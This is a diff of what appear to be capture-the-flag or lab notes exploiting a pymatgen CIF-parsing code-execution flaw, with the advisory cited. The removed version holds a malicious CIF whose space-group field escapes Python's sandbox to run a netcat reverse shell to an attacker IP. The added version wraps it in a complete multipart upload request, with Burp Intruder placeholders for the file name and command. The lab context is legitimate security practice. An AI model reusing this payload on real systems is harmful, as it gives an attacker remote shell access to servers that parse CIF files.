@@ -215,8 +215,27 @@ nikto output:
 
 CIF file pymatgen exploit: `https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f`
 
-Payload:
+Payload for Burp Intruder:
 ```
+POST /upload HTTP/1.1
+Host: 10.129.240.196:5000
+Content-Length: 921
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.129.240.196:5000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySae1pZqkTTUyVRUq
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.129.240.196:5000/dashboard
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwljjEOwzAIAP_iuQMQwHE-EwEGtWvSTFX_3kjdbjjp7tP2OvJ8tu19XPlo-2u2rengqRhFGEYgMgw5w4MTTVcDtzJZMpQXGlyZSDrKR_c-pt--MGCoQ05wHgk3rI7UqdhShLUYtE8oU6-Mu8GFnQJEKzq1e-Q68_jfoLTvDyEGL-k.Zza6Qw.IkfQZhXeS8bf_PK78pSjXu2f2Fo
+Connection: close
+
+------WebKitFormBoundarySae1pZqkTTUyVRUq
+Content-Disposition: form-data; name="file"; filename="§payload1§.cif"
+Content-Type: application/octet-stream
+
 data_Example
 _cell_length_a    10.00000
 _cell_length_b    10.00000
@@ -234,9 +253,11 @@ loop_
  H 0.00000 0.00000 0.00000 1
  O 0.50000 0.50000 0.50000 1
 
-_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.34 4444 -e sh");0,0,0'
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("§payload2§");0,0,0'
 
 
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
+------WebKitFormBoundarySae1pZqkTTUyVRUq--
+
 ```
